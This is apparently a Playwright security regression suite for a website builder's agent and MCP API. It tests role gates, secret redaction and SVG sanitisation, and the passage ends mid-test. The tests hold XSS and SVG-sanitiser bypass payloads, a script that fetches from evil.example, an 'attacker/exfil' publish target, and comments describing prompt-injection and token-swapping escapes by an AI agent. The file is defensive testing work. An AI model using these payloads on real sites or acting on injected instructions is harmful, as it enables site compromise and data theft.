import { test, expect, request as pwRequest, type APIRequestContext } from '@playwright/test'
import { LAUNCHER_SECRET } from './fixtures/session'

// Security regressions for the MCP/agent surface. Each case here is a hole that
// was open before: a key spelling that slipped past the contributor guards, a
// merge-base blob nobody redacted, an agent token that could rewrite Main, ship
// raw <script> to the live site, publish, or mint more tokens.
//
// API-level and self-bootstrapping, like store-roles.spec, and it restores the
// agent policy it changes. Named to sort AFTER smoke.spec: smoke owns the
// first-run flow and needs a server with no admin account yet, so any spec that
// bootstraps one has to run later.

const ADMIN = { email: 'smoke@example.com', password: 'supersecret1' }
const CONTRIB = { email: 'contrib@example.com', password: 'contrib-pass-1' }
const EDITOR = { email: 'editor@example.com', password: 'editor-pass-1' }
const MAIN = 'superbird-project:main'
const DRAFT = 'superbird-project:sec-spec-draft'
const BASE = 'superbird-base:sec-spec-draft'

/**
 * An admin who can BUILD — which means a launcher session, not a password
 * login. A browser session is never a builder session (`effectiveRole` in
 * server/auth.mjs), so after the gates flipped, an admin at a browser is a
 * contributor at every gate here: seeding Main would be content-merged and
 * every admin-only route would answer 403. Most of this spec is about the
 * agent fence and needs a real admin on the other side of it.
 */
async function adminContext(baseURL: string | undefined) {
  const ctx = await pwRequest.newContext({ baseURL })
  const res = await ctx.post('/api/auth/login', { data: ADMIN })
  if (!res.ok()) {
    expect((await ctx.post('/api/auth/setup', { data: { ...ADMIN, name: 'Smoke Co' } })).ok()).toBeTruthy()
  }
  // ...and upgrade the session to the kind the desktop app holds. The secret
  // proof, over the suite server's loopback.
  const minted = await ctx.post('/api/auth/launcher-session', { data: { secret: LAUNCHER_SECRET } })
  expect(minted.status(), 'the suite server must carry SUPERBIRD_LAUNCHER_SECRET').toBe(200)
  return ctx
}

/** the same account, signed in the way a person at a browser signs in */
async function browserAdminContext(baseURL: string | undefined) {
  const ctx = await pwRequest.newContext({ baseURL })
  expect((await ctx.post('/api/auth/login', { data: ADMIN })).ok()).toBeTruthy()
  return ctx
}

/** a contributor session, invited on first run and reused afterwards */
async function contributorContext(admin: APIRequestContext, baseURL: string | undefined) {
  const ctx = await pwRequest.newContext({ baseURL })
  const invite = await admin.post('/api/users/invite', {
    data: { name: 'Contrib', email: CONTRIB.email, role: 'contributor' },
  })
  if (invite.ok()) {
    const { token } = await invite.json()
    expect((await ctx.post(`/api/invite/${token}/accept`, { data: { password: CONTRIB.password } })).ok()).toBeTruthy()
  } else {
    expect((await ctx.post('/api/auth/login', { data: CONTRIB })).ok()).toBeTruthy()
  }
  return ctx
}

/**
 * An editor who can BUILD — a build role in a launcher session.
 *
 * The secret proof mints for `oldestAdmin()` only, so an editor's builder
 * session can only come from the bearer proof: a `superbirdl_` token this editor
 * approved for themselves through the device flow. That is the second builder's
 * whole path — an editor with their own Mac — and it is why a LAUNCHER
 * authorization needs a build role rather than an admin: the token carries
 * exactly the approver's own role, so admin-only was a dead end and not a
 * safeguard.
 */
async function editorContext(admin: APIRequestContext, baseURL: string | undefined) {
  const ctx = await pwRequest.newContext({ baseURL })
  const invite = await admin.post('/api/users/invite', {
    data: { name: 'Ed', email: EDITOR.email, role: 'editor' },
  })
  if (invite.ok()) {
    const { token } = await invite.json()
    expect((await ctx.post(`/api/invite/${token}/accept`, { data: { password: EDITOR.password } })).ok()).toBeTruthy()
  } else {
    expect((await ctx.post('/api/auth/login', { data: EDITOR })).ok()).toBeTruthy()
  }
  const token = await launcherToken(ctx, baseURL, 'editor launcher')
  const upgraded = await pwRequest.newContext({
    baseURL,
    extraHTTPHeaders: { authorization: `Bearer ${token}` },
  })
  expect((await upgraded.post('/api/auth/launcher-session', { data: {} })).status()).toBe(200)
  await ctx.dispose()
  return upgraded
}

/**
 * A context that presents its own client address.
 *
 * The device pool is capped per ADDRESS (two pending) as well as rate-limited
 * per address, and every context in this suite otherwise shares one socket —
 * so a spec that starts a handful of authorizations measures the limiter rather
 * than the endpoint. `TRUST_PROXY` is on for the suite server (→
 * playwright.config.ts) precisely so a spec can say who it is.
 */
let deviceClients = 0
function deviceContext(baseURL: string | undefined) {
  deviceClients += 1
  return pwRequest.newContext({
    baseURL,
    extraHTTPHeaders: { 'x-forwarded-for': `10.9.0.${deviceClients}` },
  })
}

/**
 * Run the device flow to completion as `who`, and return the raw launcher
 * token. `who` approves their own authorization, which is the point: the token
 * is minted for the approver.
 */
async function launcherToken(who: APIRequestContext, baseURL: string | undefined, name: string) {
  const anon = await deviceContext(baseURL)
  const begun = await anon.post('/api/auth/device', { data: { name, kind: 'launcher' } })
  expect(begun.ok()).toBeTruthy()
  const { userCode, deviceCode } = await begun.json()
  expect((await who.post(`/api/auth/device/${userCode}/approve`, { data: {} })).ok()).toBeTruthy()
  const got = await anon.post('/api/auth/device/token', { data: { deviceCode } })
  expect(got.ok()).toBeTruthy()
  const { token } = await got.json()
  await anon.dispose()
  expect(String(token).startsWith('superbirdl_')).toBeTruthy()
  return token as string
}

/** a bearer-token context — the credential the MCP server runs on */
async function tokenContext(admin: APIRequestContext, baseURL: string | undefined, name: string) {
  const res = await admin.post('/api/tokens', { data: { name } })
  expect(res.ok()).toBeTruthy()
  const { token } = await res.json()
  return {
    ctx: await pwRequest.newContext({ baseURL, extraHTTPHeaders: { authorization: `Bearer ${token}` } }),
    token,
  }
}

/** Main's stored blob, seeded with a smtp secret so redaction is observable */
async function seedMain(admin: APIRequestContext) {
  const body = JSON.stringify({
    name: 'Sec Co',
    pages: [{ id: 'home', name: 'Home', path: '/', status: 'published', elements: [] }],
    settings: { smtp: { host: 'smtp.example.com', password: 'hunter2' }, customCode: { head: '' } },
  })
  expect((await admin.put(`/api/store/${MAIN}`, { data: body })).ok()).toBeTruthy()
  return body
}

test('store keys cannot alias past the contributor guards', async ({ baseURL }) => {
  const admin = await adminContext(baseURL)
  await seedMain(admin)
  const contrib = await contributorContext(admin, baseURL)

  // `superbird-project__main` maps to the SAME file as `superbird-project:main`, but
  // used to slip past every startsWith('superbird-project:') check — which meant a
  // contributor could write structure into Main and read its secrets back.
  for (const alias of ['superbird-project__main', 'superbird-base__sec', 'a__b']) {
    expect((await contrib.put(`/api/store/${alias}`, { data: '{"pages":[]}' })).status()).toBe(400)
    expect((await contrib.get(`/api/store?keys=${alias}`)).status()).toBe(400)
    // admins get no special pass — the key is simply not addressable
    expect((await admin.put(`/api/store/${alias}`, { data: '{"pages":[]}' })).status()).toBe(400)
  }

  // and the real key still works
  expect((await admin.get(`/api/store?keys=${MAIN}`)).ok()).toBeTruthy()

  await admin.dispose()
  await contrib.dispose()
})

test('merge-base snapshots get the same guards as project blobs', async ({ baseURL }) => {
  const admin = await adminContext(baseURL)
  const mainBody = await seedMain(admin)
  const contrib = await contributorContext(admin, baseURL)

  // a base snapshot is a full project copy — same secrets, same structure
  expect((await admin.put(`/api/store/${BASE}`, { data: mainBody })).ok()).toBeTruthy()

  // read: the legacy secret block must be redacted for a contributor, exactly as
  // for superbird-project:*. It is REMOVED rather than nulled — integrations live
  // entirely server-side now (server/integrations.mjs), so the key must not be
  // there at all for a blob that arrived with one (an import, a restore).
  const read = (await (await contrib.get(`/api/store?keys=${BASE}`)).json()) as Record<string, string>
  const redacted = JSON.parse(read[BASE]).settings
  expect(redacted.smtp).toBeUndefined()
  expect(redacted.integrations).toBeUndefined()
  expect('smtp' in redacted).toBe(false)

  // write: a contributor's structural edit is merged away, not persisted —
  // otherwise a poisoned base makes the editor's 3-way merge propose changes
  // nobody authored
  const poisoned = JSON.parse(mainBody)
  poisoned.pages.push({ id: 'evil', name: 'Evil', path: '/evil', status: 'published', elements: [] })
  expect((await contrib.put(`/api/store/${BASE}`, { data: JSON.stringify(poisoned) })).status()).toBe(200)
  const after = (await (await admin.get(`/api/store?keys=${BASE}`)).json()) as Record<string, string>
  expect(JSON.parse(after[BASE]).pages).toHaveLength(1)

  // and custom code is refused out loud rather than silently dropped
  const withCode = JSON.parse(mainBody)
  withCode.settings.customCode = { head: '<script>evil()</script>' }
  expect((await contrib.put(`/api/store/${BASE}`, { data: JSON.stringify(withCode) })).status()).toBe(403)

  await admin.delete(`/api/store/${BASE}`)
  await admin.dispose()
  await contrib.dispose()
})

test('agent tokens are fenced: no Main, no custom code, no publish, no minting', async ({ baseURL }) => {
  const admin = await adminContext(baseURL)
  const mainBody = await seedMain(admin)
  const { ctx: agent } = await tokenContext(admin, baseURL, 'sec-spec-agent')

  // the policy starts closed
  const policy = await (await admin.get('/api/agent-policy')).json()
  expect(policy).toMatchObject({ allowMainWrites: false, allowPublish: false, allowCustomCode: false })

  // ...and only an admin BROWSER SESSION can read or change it — a token that
  // could flip these switches would guard nothing
  expect((await agent.get('/api/agent-policy')).status()).toBe(401)
  expect((await agent.put('/api/agent-policy', { data: { allowMainWrites: true } })).status()).toBe(401)

  // Main is off limits: every "a human approved this" flag in the MCP tools is
  // asserted by the agent itself, so the real check has to live here
  expect((await agent.put(`/api/store/${MAIN}`, { data: mainBody })).status()).toBe(403)
  expect((await agent.delete(`/api/store/${MAIN}`)).status()).toBe(403)

  // a draft is the safe mode, and works
  expect((await agent.put(`/api/store/${DRAFT}`, { data: mainBody })).status()).toBe(200)

  // but custom code does not — this is the injection chain's payload step
  // (a comment says "add this script and publish"), refused by field name
  const withCode = JSON.parse(mainBody)
  withCode.settings.customCode = { head: '<script>steal()</script>' }
  const denied = await agent.put(`/api/store/${DRAFT}`, { data: JSON.stringify(withCode) })
  expect(denied.status()).toBe(403)
  expect((await denied.json()).error).toContain('customCode')

  // per-page script is the same vector through a different field
  const withPageCode = JSON.parse(mainBody)
  withPageCode.pages[0].customCode = { body: 'fetch("https://evil.example")' }
  expect((await agent.put(`/api/store/${DRAFT}`, { data: JSON.stringify(withPageCode) })).status()).toBe(403)

  // repointing where the site publishes is never an agent's call, policy or not
  const repointed = JSON.parse(mainBody)
  repointed.settings.publishing = { method: 'github', github: { repo: 'attacker/exfil', branch: 'main' } }
  const repoint = await agent.put(`/api/store/${DRAFT}`, { data: JSON.stringify(repointed) })
  expect(repoint.status()).toBe(403)
  expect((await repoint.json()).error).toContain('publishing')

  // publishing puts bytes on the live origin — closed by default
  expect((await agent.post('/api/published', { data: JSON.parse(mainBody) })).status()).toBe(403)

  // a leaked token must not be able to mint replacements that survive revoking it
  expect((await agent.post('/api/tokens', { data: { name: 'spawned' } })).status()).toBe(403)

  await agent.dispose()
  await admin.delete(`/api/store/${DRAFT}`)
  await admin.dispose()
})

test('the agent policy actually opens the gate when an admin turns it on', async ({ baseURL }) => {
  const admin = await adminContext(baseURL)
  const mainBody = await seedMain(admin)
  const { ctx: agent } = await tokenContext(admin, baseURL, 'sec-spec-agent-2')

  const blocked = await agent.put(`/api/store/${MAIN}`, { data: mainBody })
  expect(blocked.status()).toBe(403)
  // the refusal has to name a control that EXISTS: it used to say "enable agent
  // Main writes in Settings" when Settings had no such switch, so the only way
  // to say yes was hand-editing agent-policy.json in the data dir
  expect((await blocked.json()).error).toContain('Agent permissions')

  // a token learns its OWN permissions from /api/auth/me, so get_status can
  // say so before the agent picks Main and discovers it at the first save
  const closed = await (await agent.get('/api/auth/me')).json()
  expect(closed.agentPolicy).toMatchObject({ allowMainWrites: false })

  expect((await admin.put('/api/agent-policy', { data: { allowMainWrites: true } })).ok()).toBeTruthy()
  expect((await agent.put(`/api/store/${MAIN}`, { data: mainBody })).status()).toBe(200)
  const opened = await (await agent.get('/api/auth/me')).json()
  expect(opened.agentPolicy).toMatchObject({ allowMainWrites: true })

  // a browser session is not an agent, so it is told nothing about the policy
  // here — it reads /api/agent-policy, which is admin + session only
  expect(await (await admin.get('/api/auth/me')).json()).not.toHaveProperty('agentPolicy')

  // restore the closed default for every spec that follows
  expect((await admin.put('/api/agent-policy', { data: { allowMainWrites: false } })).ok()).toBeTruthy()
  expect((await agent.put(`/api/store/${MAIN}`, { data: mainBody })).status()).toBe(403)

  await agent.dispose()
  await admin.dispose()
})

test('contributors can only discard their own drafts', async ({ baseURL }) => {
  const admin = await adminContext(baseURL)
  await seedMain(admin)
  const contrib = await contributorContext(admin, baseURL)
  const me = await (await contrib.get('/api/auth/me')).json()

  // ownership is the createdBy stamp in the branches meta
  const meta = {
    activeId: 'main',
    branches: [
      { id: 'main', name: 'Main', createdAt: 0 },
      { id: 'mine', name: 'Mine', createdAt: 1, createdBy: me.id },
      { id: 'theirs', name: 'Theirs', createdAt: 2, createdBy: 'some-other-user-id' },
      { id: 'legacy', name: 'Legacy', createdAt: 3 }, // pre-ownership: stays shared
    ],
  }
  expect((await admin.put('/api/store/superbird-branches', { data: JSON.stringify(meta) })).ok()).toBeTruthy()
  for (const id of ['mine', 'theirs', 'legacy']) {
    expect((await admin.put(`/api/store/superbird-project:${id}`, { data: '{"pages":[]}' })).ok()).toBeTruthy()
  }

  expect((await contrib.delete('/api/store/superbird-project:theirs')).status()).toBe(403)
  expect((await contrib.delete('/api/store/superbird-project:mine')).status()).toBe(200)
  // a draft created before ownership existed must not become undeletable
  expect((await contrib.delete('/api/store/superbird-project:legacy')).status()).toBe(200)

  await admin.delete('/api/store/superbird-project:theirs')
  await admin.dispose()
  await contrib.dispose()
})

test('a hostile SVG uploaded through the agent API is defanged and served no-script', async ({
  baseURL,
}) => {
  const admin = await adminContext(baseURL)
  const { ctx: agent } = await tokenContext(admin, baseURL, 'sec-spec-svg')

  // An SVG is the one image type that can carry script, and an agent can be
  // talked into uploading one ("here's the logo"). Two layers have to hold:
  // the bytes are stripped at intake, and serving still refuses to run script.
  const hostile =
    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">' +
    '<script>fetch("/api/store")</script>' +
    '<foreignObject><iframe src="javascript:alert(2)"></iframe></foreignObject>' +
    '<a xlink:href="javascript:alert(3)"><rect width="1" height="1"/></a></svg>'

  const up = await agent.post('/api/media?name=logo.svg', {
    headers: { 'content-type': 'image/svg+xml' },
    data: hostile,
  })
  expect(up.ok()).toBeTruthy()
  const { id } = await up.json()

  const served = await agent.get(`/media/${id}`)
  expect(served.ok()).toBeTruthy()
  const body = await served.text()
  expect(body).not.toContain('<script')
  expect(body).not.toContain('onload=')
  expect(body).not.toContain('foreignObject')
  expect(body).not.toContain('javascript:')
  // second layer: even a vector the regex missed must not execute —
  // `default-src 'none'` denies script wholesale, no script-src needed
  expect(served.headers()['content-security-policy']).toContain("default-src 'none'")
  expect(served.headers()['x-content-type-options']).toBe('nosniff')

  // and a mime the allowlist doesn't carry is refused outright
  const html = await agent.post('/api/media?name=x.html', {
    headers: { 'content-type': 'text/html' },
    data: '<script>alert(1)</script>',
  })
  expect(html.status()).toBe(415)

  // The two things four literal-matching regexes could not see. XML lets a
  // document bind any prefix to a namespace, and a browser honours the element
  // when the file is navigated to directly — so <s:script> went through
  // untouched. And an attribute value is entity-decoded by the parser AFTER a
  // regex has looked at it. On the `server` method the CSP above covers both;
  // a site published as a zip or to GitHub is served by a host that sends
  // whatever it sends, and there this pass is the only layer there is.
  const bypasses: [string, string][] = [
    [
      'namespaced script',
      '<svg xmlns="http://www.w3.org/2000/svg" xmlns:s="http://www.w3.org/2000/svg"><s:script>alert(1)</s:script><rect width="1" height="1"/></svg>',
    ],
    [
      'prefixed foreignObject',
      '<svg xmlns="http://www.w3.org/2000/svg"><x:foreignObject><rect width="1" height="1"/></x:foreignObject></svg>',
    ],
    [
      'decimal entity scheme',
      '<svg xmlns="http://www.w3.org/2000/svg"><a href="&#106;avascript:alert(1)"><rect width="1" height="1"/></a></svg>',
    ],
    [
      'hex entity scheme',
      '<svg xmlns="http://www.w3.org/2000/svg"><a href="&#x6a;avascript:alert(1)"><rect width="1" height="1"/></a></svg>',
    ],
    [
      'tab inside the scheme',
      '<svg xmlns="http://www.w3.org/2000/svg"><a href="java&#9;script:alert(1)"><rect width="1" height="1"/></a></svg>',
    ],
    [
      'xlink under another prefix',
      '<svg xmlns="http://www.w3.org/2000/svg" xmlns:l="http://www.w3.org/1999/xlink"><a l:href="javascript:alert(1)"><rect width="1" height="1"/></a></svg>',
    ],
    [
      'animation writes href',
      '<svg xmlns="http://www.w3.org/2000/svg"><a><set attributeName="href" to="javascript:alert(1)"/><rect width="1" height="1"/></a></svg>',
    ],
    [
      'nested svg data url',
      '<svg xmlns="http://www.w3.org/2000/svg"><image href="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Pjwvc2NyaXB0Pjwvc3ZnPg=="/></svg>',
    ],
  ]
  for (const [label, svg] of bypasses) {
    const res = await agent.post('/api/media?name=probe.svg', {
      headers: { 'content-type': 'image/svg+xml' },
      data: svg,
    })
    expect(res.ok(), label).toBeTruthy()
    const { id: probeId } = await res.json()
    const stored = await (await agent.get('/media/' + probeId)).text()
    expect(stored.toLowerCase(), label).not.toMatch(
      /script|javascript:|foreignobject|data:image\/svg|attributename/,
    )
  }

  await agent.dispose()
  await admin.dispose()
})

test('contributors cannot ship the site out of the instance', async ({ baseURL }) => {
  const admin = await adminContext(baseURL)
  const mainBody = await seedMain(admin)
  const contrib = await contributorContext(admin, baseURL)

  // zip/github leave the instance (a download, a push signed with the server's
  // own PAT), so they are build-capable roles only. The doc always said so; the
  // check was missing and contributors fell straight through to the export.
  for (const method of ['zip', 'github']) {
    const res = await contrib.post(`/api/published?method=${method}`, { data: JSON.parse(mainBody) })
    expect(res.status()).toBe(403)
  }

  await admin.dispose()
  await contrib.dispose()
})

test('the publish bookkeeping blobs need a build role', async ({ baseURL }) => {
  const admin = await adminContext(baseURL)
  await seedMain(admin)
  const contrib = await contributorContext(admin, baseURL)
  const { ctx: agent } = await tokenContext(admin, baseURL, 'baseline-probe')

  // These two are what the editor diffs "changed since publish" against. They
  // are not project blobs, so neither the contributor merge nor the reviewer
  // merge covered them — both wrote them verbatim, and so did an agent token
  // with no policy switch in the way.
  for (const key of ['superbird-published-baseline', 'superbird-published-info']) {
    for (const who of [contrib, agent]) {
      const res = await who.put(`/api/store/${key}`, { data: '{"pages":[]}' })
      expect(res.status(), key).toBe(403)
    }
    expect((await admin.put(`/api/store/${key}`, { data: '{"pages":[]}' })).ok()).toBeTruthy()
  }

  await admin.dispose()
  await contrib.dispose()
  await agent.dispose()
})

test('an agent token cannot open the editor, and a launcher token cannot drive the MCP', async ({
  baseURL,
}) => {
  // THE security argument of launcher-only building, in one test.
  //
  // Builder capability needs a credential the desktop app holds; agents are
  // fenced by the agent policy because they are judged by HOW they
  // authenticated. So if the session exchange accepted any `superbird_` token, an
  // injected agent would trade its token for a cookie, stop being an agent in
  // the server's eyes, and write Main with the policy off. The two kinds are
  // therefore a PREFIX and not a field: `superbirdl_` and `superbird_` are different
  // types to every parser, and each door refuses the other BY NAME so the
  // attempt is visible rather than merely unsuccessful.
  //
  // This test exists before the gates read `effectiveRole`, and it never goes
  // away.
  const admin = await adminContext(baseURL)

  /** drive the device flow to completion and return the raw token */
  const mint = async (kind: 'agent' | 'launcher') => {
    const started = await deviceContext(baseURL)
    const begun = await started.post('/api/auth/device', { data: { name: `kinds ${kind}`, kind } })
    expect(begun.ok()).toBeTruthy()
    const { userCode, deviceCode } = await begun.json()
    // the consent screen is told which sentence it is showing, because
    // "Superbird Launcher wants builder access" and "Claude wants to work on this
    // site" must not be the same approval
    expect((await (await admin.get(`/api/auth/device/${userCode}`)).json()).kind).toBe(kind)
    expect((await admin.post(`/api/auth/device/${userCode}/approve`, { data: {} })).ok()).toBeTruthy()
    const got = await started.post('/api/auth/device/token', { data: { deviceCode } })
    expect(got.ok()).toBeTruthy()
    const { token } = await got.json()
    await started.dispose()
    return token as string
  }

  const agentToken = await mint('agent')
  const launcherToken = await mint('launcher')
  expect(agentToken.startsWith('superbird_')).toBeTruthy()
  expect(launcherToken.startsWith('superbirdl_')).toBeTruthy()
  // disjoint strings, which is the whole mechanism: a launcher token cannot be
  // READ as an agent bearer, let alone resolve as one
  expect(launcherToken.startsWith('superbird_')).toBeFalsy()

  const asAgent = await pwRequest.newContext({
    baseURL,
    extraHTTPHeaders: { authorization: `Bearer ${agentToken}` },
  })
  const asLauncher = await pwRequest.newContext({
    baseURL,
    extraHTTPHeaders: { authorization: `Bearer ${launcherToken}` },
  })

  // door one: the editor's session exchange. The agent token is NAMED.
  const atEditor = await asAgent.post('/api/auth/launcher-session', { data: {} })
  expect(atEditor.status()).toBe(403)
  expect((await atEditor.json()).error).toBe('an agent token cannot open the editor')

  // door two: the API the MCP server drives. The launcher token is NAMED at
  // every path, not merely unauthorized — the one useful thing to say about it
  // is that the credential is real and at the wrong door.
  for (const path of ['/api/auth/me', `/api/store/${MAIN}`, '/api/tokens', '/api/media']) {
    const res = await asLauncher.get(path)
    expect(res.status(), path).toBe(403)
    expect((await res.json()).error, path).toContain('only opens the editor')
  }
  // a write, too — the gate is above the method split
  const wrote = await asLauncher.put(`/api/store/${MAIN}`, { data: '{"pages":[]}' })
  expect(wrote.status()).toBe(403)

  // health is above the gate, because the launcher probes it with no token
  expect((await asLauncher.get('/api/health')).ok()).toBeTruthy()

  // the launcher token does work at its own door, so the refusals above are
  // about the DOOR and not about a dead credential
  const opened = await asLauncher.post('/api/auth/launcher-session', { data: {} })
  expect(opened.status()).toBe(200)

  // and the agent token still works at its own door, same reasoning
  expect((await asAgent.get('/api/auth/me')).ok()).toBeTruthy()

  // clean up: these are real credentials on the shared suite server
  const listed = (await (await admin.get('/api/tokens')).json()).tokens as {
    id: string
    name: string
  }[]
  for (const t of listed.filter((t) => t.name.startsWith('kinds '))) {
    expect((await admin.delete(`/api/tokens/${t.id}`)).ok()).toBeTruthy()
  }

  await asAgent.dispose()
  await asLauncher.dispose()
  await admin.dispose()
})

test('a browser session is never a builder session, whatever the account', async ({ baseURL }) => {
  // THE RULE. The Build surface — structure, settings, custom code,
  // integrations, publish, invites — is reachable only from the desktop
  // launcher; a deployed instance serves Play in a browser. It is enforced at
  // the API by `effectiveRole(req, user)`, which caps a cookie session at
  // contributor whatever its account's role, and NOT by hiding UI: a test that
  // only checks the chrome tests nothing.
  //
  // The same admin account, twice, through two kinds of session.
  const launcher = await adminContext(baseURL)
  await seedMain(launcher)
  const browser = await browserAdminContext(baseURL)
  expect((await (await launcher.get('/api/auth/me')).json()).host).toBe('launcher')
  expect((await (await browser.get('/api/auth/me')).json()).host).toBe('browser')

  // `/api/auth/me` reports BOTH: the account's role and this request's.
  const asBrowser = await (await browser.get('/api/auth/me')).json()
  expect(asBrowser.role).toBe('admin')
  expect(asBrowser.effectiveRole).toBe('contributor')
  expect(asBrowser.canBuild).toBe(false)
  const asLauncher = await (await launcher.get('/api/auth/me')).json()
  expect(asLauncher.role).toBe('admin')
  expect(asLauncher.effectiveRole).toBe('admin')
  expect(asLauncher.canBuild).toBe(true)

  // --- refused in a browser, allowed from the launcher ---
  const invite = { name: 'Nope', email: 'nope@example.com', role: 'contributor' }
  expect((await browser.post('/api/users/invite', { data: invite })).status()).toBe(403)
  expect((await browser.get('/api/users')).status()).toBe(403)
  expect((await browser.post('/api/tokens', { data: { name: 'nope' } })).status()).toBe(403)
  expect((await browser.get('/api/tokens')).status()).toBe(403)
  expect((await browser.put('/api/agent-policy', { data: { allowMainWrites: true } })).status()).toBe(403)
  expect((await browser.get('/api/snapshots')).status()).toBe(403)
  expect((await browser.get('/api/project-export')).status()).toBe(403)
  expect((await browser.post('/api/project-import', { data: 'not a zip' })).status()).toBe(403)
  // zip and github ship the site OUT of the instance, so a contributor — which
  // is what this admin is here — may not
  expect((await browser.post('/api/published?method=zip', { data: '{"pages":[]}' })).status()).toBe(403)
  expect((await browser.post('/api/published?method=github', { data: '{"pages":[]}' })).status()).toBe(403)

  expect((await launcher.get('/api/users')).ok()).toBeTruthy()
  expect((await launcher.get('/api/tokens')).ok()).toBeTruthy()
  expect((await launcher.get('/api/snapshots')).ok()).toBeTruthy()

  // --- a project write is CONTENT-MERGED, exactly as a contributor's is ---
  const readMain = async (ctx: APIRequestContext) => {
    // there is no single-key store GET — reads go through `?keys=`
    const feed = (await (await ctx.get(`/api/store?keys=${MAIN}`)).json()) as Record<string, string>
    return JSON.parse(feed[MAIN])
  }
  const stored = await readMain(launcher)
  expect(Array.isArray(stored.pages)).toBe(true)
  const structural = {
    ...stored,
    pages: [...(stored.pages ?? []), { id: 'browser-admin-page', name: 'Snuck in', elements: [] }],
  }
  const wrote = await browser.put(`/api/store/${MAIN}`, { data: JSON.stringify(structural) })
  expect(wrote.ok(), 'a content write succeeds — the structure in it is dropped').toBeTruthy()
  const after = await readMain(launcher)
  expect((after.pages ?? []).some((p: { id: string }) => p.id === 'browser-admin-page')).toBe(false)

  // custom code and the publish target are refused BY NAME, never dropped: a
  // silent drop reads as success, so nobody learns something tried
  const code = await browser.put(`/api/store/${MAIN}`, {
    data: JSON.stringify({
      ...stored,
      settings: { ...stored.settings, customCode: { head: '<script>x</script>', body: '' } },
    }),
  })
  expect(code.status()).toBe(403)
  expect((await code.json()).error).toMatch(/custom code/i)

  // and the server-side secrets in the blob are redacted on the way out, as
  // for any contributor — REMOVED, not nulled
  expect('smtp' in (await readMain(browser)).settings).toBe(false)
  expect('smtp' in (await readMain(launcher)).settings).toBe(true)

  // the same account from the launcher writes structure, because that is the
  // whole point: the rule is about the SESSION and not about the person
  const ok = await launcher.put(`/api/store/${MAIN}`, { data: JSON.stringify(structural) })
  expect(ok.ok()).toBeTruthy()
  const landed = await readMain(launcher)
  expect((landed.pages ?? []).some((p: { id: string }) => p.id === 'browser-admin-page')).toBe(true)
  // put Main back
  expect((await launcher.put(`/api/store/${MAIN}`, { data: JSON.stringify(stored) })).ok()).toBeTruthy()

  await browser.dispose()
  await launcher.dispose()
})

test('who may authorize what: a builder for a launcher, an admin for an agent', async ({
  baseURL,
}) => {
  // The device flow's proof of authority is "I can sign in to this instance",
  // and what that buys depends on WHAT is being approved.
  //
  // A LAUNCHER token carries exactly the approver's own role, so a build role
  // is the right bar — and admin-only was a dead end rather than a safeguard:
  // an editor with their own Mac could not be authorized at all, because the
  // token is minted for whoever approved it, so an admin approving an editor's
  // launcher would hand that Mac the ADMIN's authority.
  //
  // An AGENT token is instance-wide authority governed by the agent policy,
  // which is an admin's to set. That stays admin-only.
  const admin = await adminContext(baseURL)
  const contrib = await contributorContext(admin, baseURL)
  const editorSession = await pwRequest.newContext({ baseURL })
  const invited = await admin.post('/api/users/invite', {
    data: { name: 'Ed', email: EDITOR.email, role: 'editor' },
  })
  if (invited.ok()) {
    const { token } = await invited.json()
    await editorSession.post(`/api/invite/${token}/accept`, { data: { password: EDITOR.password } })
  } else {
    expect((await editorSession.post('/api/auth/login', { data: EDITOR })).ok()).toBeTruthy()
  }

  const begin = async (kind: 'agent' | 'launcher') => {
    const anon = await deviceContext(baseURL)
    const begun = await anon.post('/api/auth/device', { data: { name: `who ${kind}`, kind } })
    expect(begun.ok(), await begun.text()).toBeTruthy()
    return { anon, ...(await begun.json()) }
  }

  // a contributor cannot even READ the consent screen, for either kind — so a
  // code left on somebody's terminal is not something they can act on
  for (const kind of ['agent', 'launcher'] as const) {
    const { anon, userCode } = await begin(kind)
    expect((await contrib.get(`/api/auth/device/${userCode}`)).status(), kind).toBe(403)
    expect((await contrib.post(`/api/auth/device/${userCode}/approve`, { data: {} })).status(), kind).toBe(403)
    await anon.dispose()
  }

  // an editor may approve a LAUNCHER…
  {
    const { anon, userCode, deviceCode } = await begin('launcher')
    expect((await editorSession.get(`/api/auth/device/${userCode}`)).ok()).toBeTruthy()
    expect((await editorSession.post(`/api/auth/device/${userCode}/approve`, { data: {} })).ok()).toBeTruthy()
    const { token } = await (await anon.post('/api/auth/device/token', { data: { deviceCode } })).json()
    expect(String(token).startsWith('superbirdl_')).toBeTruthy()
    await anon.dispose()
  }

  // …and may NOT approve an AGENT
  {
    const { anon, userCode } = await begin('agent')
    const refused = await editorSession.post(`/api/auth/device/${userCode}/approve`, { data: {} })
    expect(refused.status()).toBe(403)
    expect((await refused.json()).error).toContain('admin')
    await anon.dispose()
  }

  // denying is open to anyone signed in: saying no can only reduce access, and
  // the person reading a code off a screen should be able to refuse it
  {
    const { anon, userCode, deviceCode } = await begin('agent')
    expect((await contrib.post(`/api/auth/device/${userCode}/deny`, { data: {} })).ok()).toBeTruthy()
    const after = await anon.post('/api/auth/device/token', { data: { deviceCode } })
    expect(after.ok()).toBeFalsy()
    await anon.dispose()
  }

  // clean up the launcher token this test left on the shared server
  const listed = (await (await admin.get('/api/tokens')).json()).tokens as { id: string; name: string }[]
  for (const t of listed.filter((t) => t.name.startsWith('who '))) {
    await admin.delete(`/api/tokens/${t.id}`)
  }

  await editorSession.dispose()
  await contrib.dispose()
  await admin.dispose()
})

test('a malformed percent-escape is a bad request, not an internal error', async ({ baseURL }) => {
  // `decodeURIComponent` throws on a lone escape, which reached the global
  // catch: an unauthenticated GET answered "internal error (ref …)" and logged
  // a stack for it — a log-spam primitive, and a 500 for a plainly bad request.
  // the routes a stranger can reach: an authed one answers 401 first, which
  // is the right answer and not what this is about
  const anon = await pwRequest.newContext({ baseURL })
  for (const path of ['/%E0', '/media/%E0', '/api/invite/%E0']) {
    const res = await anon.get(path)
    expect(res.status(), path).toBe(400)
    expect(await res.text(), path).not.toContain('internal error')
  }
  await anon.dispose()
})

test('an editor cannot aim the server GitHub token, nor fire it', async ({ baseURL }) => {
  const admin = await adminContext(baseURL)
  const mainBody = await seedMain(admin)
  const editor = await editorContext(admin, baseURL)

  // `settings.publishing` is read from STORED Main at publish time, and an
  // editor writes Main freely — so the publishing guard exempting build roles
  // let an editor point the operator's PAT at any repo it could reach. The
  // push builds a tree with no base_tree, which replaces that branch's root.
  const retargeted = JSON.parse(mainBody)
  retargeted.settings.publishing = { method: 'github', github: { repo: 'theirs/other', branch: 'main' } }
  const aimed = await editor.put(`/api/store/${MAIN}`, { data: JSON.stringify(retargeted) })
